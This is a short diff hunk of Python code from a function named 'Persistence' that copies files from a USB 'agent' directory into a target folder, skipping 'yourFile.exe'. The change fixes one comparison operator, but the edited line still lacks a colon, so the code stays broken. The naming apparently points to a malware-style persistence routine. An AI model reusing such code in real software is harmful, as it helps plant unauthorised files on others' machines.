@@ -20,7 +20,7 @@ def Persistence(agentUsbDirectory):
         return 1
     else:
         for files in os.listdir(agentUsbDirectory):
-            if files =!= "yourFile.exe"
+            if files != "yourFile.exe"
                 if os.path.isfile(targetDirPath + "\\" + files) == False:
                     shutil.copy(agentUsbDirectory + "\\" + files, targetDirPath)
 
